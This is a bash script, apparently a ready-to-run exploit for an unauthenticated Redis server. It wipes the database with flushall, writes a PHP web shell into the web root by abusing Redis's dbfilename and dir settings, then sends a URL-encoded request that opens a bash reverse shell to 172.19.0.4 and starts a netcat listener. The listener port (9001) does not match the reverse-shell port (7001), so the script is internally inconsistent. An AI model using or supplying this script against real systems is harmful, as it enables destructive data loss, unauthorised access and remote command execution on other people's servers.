#!/usr/bin/env bash

~/redis/src/redis-cli -h localhost flushall
~/redis/src/redis-cli -h localhost set pwn '<?php system($_REQUEST['cmd']); ?>'
~/redis/src/redis-cli -h localhost config set dbfilename shell.php
~/redis/src/redis-cli -h localhost config set dir /var/www/html/
~/redis/src/redis-cli -h localhost save
(sleep 0.1; curl -s -X POST -d 'cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.4%2F7001%200%3E%261%27' localhost:8890/shell.php >/dev/null &)
rlwrap nc -lvnp 9001
